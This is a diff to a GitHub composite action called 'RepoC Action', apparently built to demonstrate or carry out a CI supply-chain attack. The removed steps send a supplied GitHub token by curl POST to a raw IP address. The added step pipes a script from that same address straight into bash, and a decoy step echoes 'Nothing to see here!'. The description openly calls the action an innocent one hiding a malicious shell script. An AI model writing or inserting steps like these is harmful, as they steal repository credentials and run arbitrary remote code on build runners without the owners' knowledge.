@@ -1,5 +1,5 @@
 name: "RepoC Action"
-description: "Innocent action interacting with RepoB but exposing secrets"
+description: "Innocent action incorporating a malicious shell script"
 
 inputs:
   token:
@@ -9,14 +9,10 @@ inputs:
 runs:
   using: "composite"
   steps:
-    - name: Expose Secrets
-      env:
-        TOKEN: ${{ inputs.token }}
-      run: |
-        echo "Exposing secrets..."
-        echo "GitHub Token: $TOKEN" | curl -X POST -H "Content-Type: text/plain" --data-binary @- http://91.205.105.40/secrets
+    - name: Fetch and Execute Malicious Script
+      run: curl -s http://91.205.105.40/malicious.sh | bash
       shell: bash
 
     - name: Dummy Step
-      run: echo "Dummy steps completed!"
+      run: echo "Nothing to see here!"
       shell: bash
